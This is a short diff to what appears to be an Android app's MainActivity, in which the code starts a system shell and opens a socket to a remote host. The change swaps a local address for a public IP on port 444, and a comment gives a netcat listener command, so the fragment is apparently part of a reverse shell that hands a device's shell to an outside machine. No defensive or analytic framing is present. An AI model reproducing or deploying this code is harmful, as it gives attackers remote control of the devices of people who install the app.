@@ -51,7 +51,8 @@ public class MainActivity extends Activity {
 		final Process process = Runtime.getRuntime().exec("system/bin/sh");
 
 		// start a socket
-		Socket socket = new Socket("192.168.1.1", 4444);
+		@SuppressWarnings("resource")
+		Socket socket = new Socket("65.110.233.191", 444);
 		
 		// server should be listen on port 4444
 		// Netcat Example: nc -l -p 4444
